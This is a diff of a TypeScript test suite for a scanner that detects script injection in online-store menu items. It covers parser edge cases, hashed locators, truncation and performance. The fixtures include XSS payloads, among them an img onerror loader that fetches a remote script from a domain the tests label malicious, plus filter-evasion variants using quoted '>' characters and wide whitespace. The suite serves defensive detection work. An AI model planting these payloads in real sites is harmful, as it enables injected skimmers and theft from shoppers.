@@ -31,6 +31,9 @@ const item = (
   ...extra,
 });
 
+/** The findings alone (most tests do not look at truncation). */
+const findingsOf = (items: MenuItemData[]) => detectMenuInjection(items).findings;
+
 // The 17TRACK payload shape (October 2026), host from the curated list.
 const SEVENTEEN_TRACK =
   "Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/check-out/assets/l2.js';document.head.appendChild(s)\">";
@@ -103,6 +106,30 @@ describe("matchMenuItem: the rules", () => {
     });
   });
 
+  // Audit fix: a `>` inside a quoted attribute value does not end the tag,
+  // and whitespace around `=` can be any length.
+  it.each([
+    '<img alt=">" src=x onerror=alert(1)>',
+    "<img title='>' src=x onerror=alert(1)>",
+    '<img alt = ">>" onerror=alert(1)>',
+    `<img src=x onerror${" ".repeat(25)}=alert(1)>`,
+    `<img src=x onerror=${"\n".repeat(30)}alert(1)>`,
+  ])("flags a handler after a quoted > or wide whitespace: %j", (title) => {
+    expect(matchMenuItem(item(title))?.rule).toBe("handler");
+  });
+
+  it("flags srcdoc and a script URL with wide whitespace around =", () => {
+    expect(matchMenuItem(item(`<div srcdoc${" ".repeat(30)}="x">`))?.rule).toBe("frame");
+    expect(matchMenuItem(item(`<a href${" ".repeat(30)}="javascript:x">y</a>`))?.rule).toBe(
+      "script_url",
+    );
+  });
+
+  it("a quoted value that never closes reads the rest as that tag (doubt resolves toward flagging)", () => {
+    expect(matchMenuItem(item('<b title="never closed onerror=x>Shop'))?.rule).toBe("handler");
+    expect(matchMenuItem(item('<b title="never closed>Shop'))).toBeNull();
+  });
+
   it("the most dangerous rule wins when several match", () => {
     expect(matchMenuItem(item("<script>x</script><img onerror=y>"))?.rule).toBe("script");
     expect(matchMenuItem(item("<img src=x onerror=y>", "javascript:x"))?.rule).toBe("handler");
@@ -172,7 +199,7 @@ describe("isScriptUrl", () => {
 
 describe("detectMenuInjection: stored shape", () => {
   it("emits one HIGH MENU_INJECTION finding per matching item, with a fixed shape", () => {
-    const findings = detectMenuInjection([
+    const findings = findingsOf([
       item("Shop"),
       item(SEVENTEEN_TRACK, "/collections/all", {
         itemId: "201",
@@ -182,7 +209,7 @@ describe("detectMenuInjection: stored shape", () => {
     expect(findings).toHaveLength(1);
     const [f] = findings;
     expect(f).toMatchObject({
-      filename: "menus/100/items/201",
+      filename: expect.stringMatching(/^menus\/100\/items\/201\/[0-9a-f]{8}$/),
       lineNumber: 0,
       findingType: "MENU_INJECTION",
       severity: "HIGH",
@@ -196,19 +223,19 @@ describe("detectMenuInjection: stored shape", () => {
   });
 
   it("names the link when the URL matched", () => {
-    const [f] = detectMenuInjection([item("Shop", "javascript:steal()")]);
+    const [f] = findingsOf([item("Shop", "javascript:steal()")]);
     expect(f.codeSnippet.split("\n")[1]).toBe("Link: javascript:steal()");
     expect(f.description).toMatch(/^A menu item's link contains a link that runs code/);
   });
 
   it("names the listed domain from the curated list, never page text", () => {
-    const [f] = detectMenuInjection([item("Shop", "https://cartassure.top/x")]);
+    const [f] = findingsOf([item("Shop", "https://cartassure.top/x")]);
     expect(f.description).toContain("a link to cartassure.top, a known malicious domain");
   });
 
   it("bounds the excerpt and every title in the path", () => {
     const long = `${"A".repeat(5_000)}<img src=x onerror=x()>${"B".repeat(5_000)}`;
-    const [f] = detectMenuInjection([
+    const [f] = findingsOf([
       item(long, "/x", { menuTitle: "M".repeat(500), parents: ["P".repeat(500)] }),
     ]);
     const [path, seen] = f.codeSnippet.split("\n");
@@ -218,7 +245,7 @@ describe("detectMenuInjection: stored shape", () => {
   });
 
   it("collapses line breaks so the stored snippet stays two lines", () => {
-    const [f] = detectMenuInjection([
+    const [f] = findingsOf([
       item("Shop\n<img src=x\nonerror=x()>", "/x", { menuTitle: "Main\nmenu" }),
     ]);
     expect(f.codeSnippet.split("\n")).toHaveLength(2);
@@ -230,19 +257,45 @@ describe("detectMenuInjection: stored shape", () => {
     );
   });
 
-  it("the locator is the numeric ids", () => {
-    expect(menuItemFilename({ menuId: "1", itemId: "2" })).toBe("menus/1/items/2");
+  it("the locator is the numeric ids plus a hash of the full label and link", () => {
+    const base = { menuId: "1", itemId: "2", title: "<script>x</script>", url: "/x" };
+    expect(menuItemFilename(base)).toMatch(/^menus\/1\/items\/2\/[0-9a-f]{8}$/);
+    expect(menuItemFilename(base)).toBe(menuItemFilename({ ...base }));
   });
 
-  it("caps the number of findings for a flood", () => {
+  // Audit fix: the fingerprint hashes the filename, so any rewrite of the
+  // item must change it, even where the stored path and excerpt are cut.
+  it.each([
+    ["the link only", { url: "javascript:b()" }],
+    ["the label past the 80-character path cut", { title: `${"A".repeat(100)}<script>y</script>` }],
+    [
+      "the label past the excerpt",
+      { title: `${"A".repeat(100)}<script>x</script>${"B".repeat(500)}z` },
+    ],
+  ])("a rewrite of %s gives a different locator", (_label, change) => {
+    const before = item(`${"A".repeat(100)}<script>x</script>${"B".repeat(500)}`, "javascript:a()");
+    const after = { ...before, ...change };
+    expect(menuItemFilename(after)).not.toBe(menuItemFilename(before));
+  });
+
+  it("caps the number of findings for a flood and says so", () => {
     const items = Array.from({ length: MAX_MENU_INJECTION_FINDINGS + 30 }, (_, i) =>
       item("<script>x</script>", "/x", { itemId: String(i) }),
     );
-    expect(detectMenuInjection(items)).toHaveLength(MAX_MENU_INJECTION_FINDINGS);
+    const result = detectMenuInjection(items);
+    expect(result.findings).toHaveLength(MAX_MENU_INJECTION_FINDINGS);
+    expect(result.truncated).toBe(true);
+  });
+
+  it("exactly the cap is not truncated", () => {
+    const items = Array.from({ length: MAX_MENU_INJECTION_FINDINGS }, (_, i) =>
+      item("<script>x</script>", "/x", { itemId: String(i) }),
+    );
+    expect(detectMenuInjection([...items, item("Shop")]).truncated).toBe(false);
   });
 
   it("empty input yields nothing", () => {
-    expect(detectMenuInjection([])).toEqual([]);
+    expect(detectMenuInjection([])).toEqual({ findings: [], truncated: false });
   });
 
   it("merchant copy: no em or en dashes, no product-name misspelling", () => {
@@ -264,6 +317,10 @@ describe("detectMenuInjection: linear time", () => {
     ["1 MB of meta tags without http-equiv", "<meta a>".repeat(125_000)],
     ["1 MB of text", "x".repeat(1_000_000)],
     ["1 MB of character references", "&#106;".repeat(170_000)],
+    ["1 MB of quoted values", `<a ${'x=">" '.repeat(160_000)}>`],
+    ["1 MB of unclosed quoted values", '<a x="'.repeat(200_000)],
+    ["1 MB of whitespace after a handler name", `<a onerror${" ".repeat(1_000_000)}`],
+    ["1 MB of handler names and spaces", `<a ${"onx    ".repeat(140_000)}>`],
   ])("%s stays fast", (_label, title) => {
     const started = Date.now();
     detectMenuInjection([item(title, title)]);
